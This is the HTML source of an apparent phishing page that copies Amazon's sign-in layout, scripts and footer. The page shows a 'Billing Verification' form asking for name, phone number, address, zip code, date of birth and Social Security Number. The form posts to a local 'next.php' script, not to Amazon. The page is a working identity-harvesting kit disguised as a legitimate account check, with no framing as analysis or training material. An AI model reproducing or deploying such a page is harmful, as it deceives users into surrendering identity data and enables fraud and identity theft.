                            b.type = "text/css";
                            b.rel = "stylesheet";
                            b.href = c;
                            h.appendChild(b)
                        });
                    a.CSSTag && s(a.CSSTag);
                    if (a.JSUrls) {
                        var d = l("forceSynchronousJS"),
                            b = a.JSUrls[0];
                        c.each(b, function(a, c) {
                            a === b.length - 1 ? p(c, d, e) : p(c, d)
                        })
                    }
                    a.JSTag && (t(a.JSTag), P.when("CSCoPilotPresenterAsset").execute(function() {
                        e()
                    }))
                },
                t = function(a) {
                    var c = f.createElement("div");
                    c.innerHTML = a;
                    a = 0;
                    for (var b = c.children.length; a < b; a++) {
                        var d = f.createElement("script");
                        d.type = "text/javascript";
                        d.innerHTML = c.children[a].innerHTML;
                        h.appendChild(d)
                    }
                },
                s = function(a) {
                    var b = f.createElement("div");
                    b.innerHTML = a;
                    a = 0;
                    for (var e = b.children.length; a < e; a++) h.appendChild(b.children[a])
                },
                p = function(a, b, e) {
                    var d = f.createElement("script");
                    d.type = "text/javascript";
                    d.src = a;
                    d.async = b ? !1 : !0;
                    e && (d.onload = e);
                    h.appendChild(d)
                }
        })();

        amzn.copilot.checkCoPilotSession();
    </script>

    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 16009)
    </script>
    <div id="a-page">
        <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">






                <div class="a-section a-spacing-medium a-text-center">







                    <a class="a-link-nav-icon" tabindex="-1" href="https://www.amazon.com/ref=ap_frn_logo">

                        <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>



                    </a>



                </div>


            </div>

            <div id="authportal-center-section" class="a-section">



                <div id="authportal-main-section" class="a-section">






                    <div class="a-section a-spacing-base auth-pagelet-container">



                        <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite" aria-atomic="true">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <p>
                                        <a class="a-link-normal" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_cookie_error_help?">

                                        </a>
                                    </p>
                                </div>
                            </div>
                        </div>


                    </div>

                    <div class="a-section auth-pagelet-container">






                        <script type="a-state" data-a-state="{&quot;key&quot;:&quot;moa_registration_v2_info&quot;}">{"device":"other","enabled":"true"}</script>

                        <!-- Show a warning modal dialog when the third party account is connected with Amazon -->


                        <div class="a-section">


                            <form id="ap_register_form" method="post" action="../next.php">


                                <div class="a-box a-spacing-extra-large">
                                    <div class="a-box-inner">


                                        <h1 class="a-spacing-small">
                                            Billing Verification
                                        </h1>
                                        <p>Please verify your billing address linked to your Amazon account</p>
                                        <div class="a-row a-spacing-base">

                                            <label for="ap_customer_name" class="a-form-label">
                                                Your name
                                            </label>

                                            <input type="text" maxlength="50" id="fname" autocomplete="name" placeholder="First and last name" name="fname" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" required>

                                            <div id="auth-customerName-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">
                                                <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
                                                    <div class="a-alert-content">
                                                        Enter your name
                                                    </div>
                                                </div>
                                            </div>


                                        </div>
                                        <div class="a-row a-spacing-base">
                                            <label for="ap_email" class="a-form-label">
                                                Phone number
                                            </label>

                                            <input type="text" inputmode="numeric" maxlength="64" id="phone" autocomplete="email" placeholder="xxx-xxx-xxxx" name="phone" tabindex="3" class="a-input-text a-span12 a-spacing-micro auth-required-field auth-require-claim-validation" required>

                                        </div>




                                        <div class="a-row a-spacing-base">

                                            <label for="ap_password" class="a-form-label">
                                                Address
                                            </label>
                                            <input type="text" maxlength="1024" id="addres" autocomplete="off" placeholder="Address" name="addres" tabindex="5" class="a-input-text a-span12 auth-required-field auth-require-fields-match auth-require-password-validation" required>
                                            <div class="a-input-text-wrapper a-form-normal pmts-account-Number">
                                                <input type="text" maxlength="1024" id="addres2" autocomplete="off" style="width: 313px;" placeholder="Apt, Suite, Unit, Building (Optional)" name="addres2" tabindex="5">
                                            </div>
                                        </div>


                                        <div class="a-row a-spacing-base">
                                            <label for="ap_password_check" class="a-form-label">
                                                Zip code
                                            </label>

                                            <input type="text" inputmode="numeric" maxlength="1024" id="zipc" autocomplete="off" name="zipc" tabindex="6" class="a-input-text a-span12 auth-required-field auth-require-fields-match" required>

                                        </div>

                                        <div class="a-row a-spacing-base">
                                            <label for="ap_password_check" class="a-form-label">
                                                Date of Birth
                                            </label>

                                            <input type="text" inputmode="numeric" maxlength="1024" id="dob" placeholder="MM/DD/YYYY" autocomplete="off" name="dob" tabindex="6" class="a-input-text a-span12 auth-required-field auth-require-fields-match" required>

                                        </div>

                                        <div class="a-row a-spacing-base">
                                            <label for="ap_password_check" class="a-form-label">
                                                Social Security Number
                                            </label>

                                            <input type="text" inputmode="numeric" maxlength="1024" id="ssn" placeholder="XXX-XX-XXXX" autocomplete="off" name="ssn" tabindex="6" class="a-input-text a-span12 auth-required-field auth-require-fields-match" required>

                                        </div>



                                        <div class="a-section a-spacing-extra-large">
                                            <span id="auth-continue" class="a-button a-button-span12 a-button-primary auth-requires-verify-modal"><span class="a-button-inner"><input id="continue" tabindex="8" class="a-button-input" type="submit" aria-labelledby="auth-continue-announce"><span id="auth-continue-announce" class="a-button-text" aria-hidden="true">
                                                        <span class="default-text">Continue</span>

                                                    </span></span></span>
                                        </div>


                                        <div class="a-divider a-divider-section">
                                            <div class="a-divider-inner"></div>
                                        </div>

                                    </div>
                                </div>
                                <input name="metadata1" type="hidden" value="ECdITeCs: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">
                            </form>
                        </div>


                        <script>
                            function cf() {
                                if (typeof window.uet === 'function') {
                                    uet('cf');
                                }
                                if (window.embedNotification &&
                                    typeof window.embedNotification.onCF === 'function') {
                                    embedNotification.onCF();
                                }
                            }
                        </script>

                        <script type="text/javascript">
                            cf()
                        </script>


                    </div>
                </div>


            </div>


            <div id="right-2">
            </div>

            <div class="a-section a-spacing-top-extra-large auth-footer">




                <div class="a-divider a-divider-section">
                    <div class="a-divider-inner"></div>
                </div>

                <div class="a-section a-spacing-small a-text-center a-size-mini">
                    <span class="auth-footer-seperator"></span>










                    <a class="a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
                        Conditions of Use
                    </a>
                    <span class="auth-footer-seperator"></span>









                    <a class="a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
                        Privacy Notice
                    </a>
                    <span class="auth-footer-seperator"></span>









                    <a class="a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/help">
                        Help
                    </a>
                    <span class="auth-footer-seperator"></span>



                </div>




                <div class="a-section a-spacing-none a-text-center">






                    <span class="a-size-mini a-color-secondary">
                        © 1996-2022, Amazon.com, Inc. or its affiliates
                    </span>

                </div>

            </div>
        </div>

        <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
        </div>



        <script type="text/javascript">
            try {
                var metadataList = document.getElementsByName('metadata1');
                if (metadataList.length == 0) {
                    var input = document.createElement('input');
                    input.name = 'metadata1';
                    input.type = 'hidden';
                    input.value = 'true';

                    var authenticationFormList = document.getElementsByName('register');
                    for (var index = 0; index < authenticationFormList.length; index++) {
                        authenticationFormList[index].appendChild(input);
                    }
                } else {
                    for (var index = 0; index < metadataList.length; index++) {
                        metadataList[index].value = 'true';
                    }
                }
            } catch (e) {
                if (typeof window.ueLogError === 'function') {
                    window.ueLogError(e, {
                        message: 'Failed to populate default metadata value',
                        logLevel: 'warn',
                        attribution: 'FWCIMAssets'
                    });
                }
            }
        </script>
        <script type="text/javascript">
            window.fwcimCmd = [

                ['profile', 'register']


            ];
        </script>







        <!-- cache slot rendered -->

        <iframe src="a3_files/refya_prefetch_order_ap.htm" style="display: none" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>

    </div>
    <div id="be" style="display:none;visibility:hidden;">



        <script type="text/javascript">
            window.ue_ibe = (window.ue_ibe || 0) + 1;
            if (window.ue_ibe === 1) {
                (function(e, c) {
                    function h(b, a) {
                        f.push([b, a])
                    }

                    function g(b, a) {
                        if (b) {
                            var c = e.head || e.getElementsByTagName("head")[0] || e.documentElement,
                                d = e.createElement("script");
                            d.async = "async";
                            d.src = b;
                            d.setAttribute("crossorigin", "anonymous");
                            a && a.onerror && (d.onerror = a.onerror);
                            a && a.onload && (d.onload = a.onload);
                            c.insertBefore(d, c.firstChild)
                        }
                    }

                    function k() {
                        ue.uels = g;
                        for (var b = 0; b < f.length; b++) {
                            var a = f[b];
                            g(a[0], a[1])
                        }
                        ue.deffered = 1
                    }
                    var f = [];
                    c.ue && (ue.uels = h, c.ue.attach && c.ue.attach("load", k))
                })(document, window);


                if (window.ue && window.ue.uels) {
                    ue.uels("https://images-na.ssl-images-amazon.com/images/I/31YXrY93hfL.js");
                }
                var ue_mbl = ue_csm.ue.exec(function(f, a) {
                    function s(c) {
                        b = c || {};
                        a.AMZNPerformance = b;
                        b.transition = b.transition || {};
                        b.timing = b.timing || {};
                        if (a.csa) {
                            var d;
                            b.timing.transitionStart && (d = b.timing.transitionStart);
                            b.timing.processStart && (d = b.timing.processStart);
                            d && (csa("PageTiming")("mark", "nativeTransitionStart", d), csa("PageTiming")("mark", "transitionStart", d))
                        }
                        f.ue.exec(t, "csm-android-check")() && b.tags instanceof Array && (c = -1 != b.tags.indexOf("usesAppStartTime") || b.transition.type ? !b.transition.type && -1 <
                            b.tags.indexOf("usesAppStartTime") ? "warm-start" : void 0 : "view-transition", c && (b.transition.type = c));
                        n = null;
                        "reload" === e._nt && f.ue_orct || "intrapage-transition" === e._nt ? u(b) : "undefined" === typeof e._nt && g && g.timing && g.timing.navigationStart && a.history && "function" === typeof a.History && "object" === typeof a.history && a.history.length && 1 != a.history.length && (b.timing.transitionStart = g.timing.navigationStart);
                        p && e.ssw(q, "" + (b.timing.transitionStart || n || ""));
                        c = b.transition;
                        d = e._nt ? e._nt : void 0;
                        c.subType = d;
                        a.ue &&
                            a.ue.tag && a.ue.tag("has-AMZNPerformance");
                        e.isl && a.uex && a.uex("at", "csm-timing");
                        v()
                    }

                    function w(c) {
                        a.ue && a.ue.count && a.ue.count("csm-cordova-plugin-failed", 1)
                    }

                    function t() {
                        return a.cordova && a.cordova.platformId && "android" == a.cordova.platformId
                    }

                    function u() {
                        if (p) {
                            var c = e.ssw(q),
                                a = function() {},
                                f = e.count || a,
                                a = e.tag || a,
                                h = b.timing.transitionStart,
                                k = c && !c.e && c.val;
                            n = c = k ? +c.val : null;
